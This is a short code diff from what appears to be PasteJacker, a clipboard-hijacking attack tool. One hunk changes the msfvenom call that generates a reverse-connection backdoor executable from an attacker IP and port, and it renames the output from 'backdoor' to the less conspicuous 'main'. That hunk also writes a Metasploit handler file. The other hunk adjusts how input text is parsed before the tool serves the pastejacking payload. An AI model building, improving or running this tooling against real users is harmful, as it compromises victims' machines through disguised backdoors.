@@ -89,12 +89,12 @@ def generation(payload,ip,port):
         menu()
     else:
         f = "elf" if "linux" in payload else "exe"
-        c = utils.execute("msfvenom -p "+payload+" LHOST=" + ip + " LPORT=" + str(port) + " -f "+f+" >/root/.pastejacker/backdoor."+f)
+        c = utils.execute("msfvenom -p "+payload+" LHOST=" + ip + " LPORT=" + str(port) + " -f "+f+" >/root/.pastejacker/main."+f)
         if not c:
             error("Failed to generate msfvenom backdoor!")
             sys.exit(1)
         else:
-            status("MSFVenom backdoor saved as "+M+" /root/.pastejacker/backdoor."+f+end)
+            status("MSFVenom backdoor saved as "+M+" /root/.pastejacker/main."+f+end)
             utils.write_resource(payload,ip,port)
             status("Metasploit resource file saved as "+M+" /root/.pastejacker/msf_handler.rc"+end)
             template_menu()
@@ -115,7 +115,7 @@ def serve_menu():
             if not settings.final_liner:
                 prepare_liner(settings.ip,port)
             msg = utils.ask_for_text()
-            b,c = msg.split()[0], " ".join(msg.split()[1:])
+            b,c = msg.split(" ")[0], " ".join(msg.split(" ")[1:])
             final_serve(port, b, c, get_escapes())
             break
 
